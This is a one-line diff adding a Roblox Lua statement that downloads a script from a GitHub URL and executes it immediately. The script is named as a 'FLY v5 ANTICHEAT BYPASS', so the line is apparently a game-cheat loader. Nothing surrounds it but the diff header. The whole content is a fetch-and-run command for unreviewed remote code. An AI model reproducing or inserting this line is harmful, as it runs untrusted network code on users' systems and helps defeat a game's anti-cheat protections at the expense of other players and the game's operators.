@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/UwU-UwU-UwU-UwU-UwU/fly-gui-updated-v5-/refs/heads/main/FLY%20v5%20ANTICHEAT%20BYPASS.txt"))()
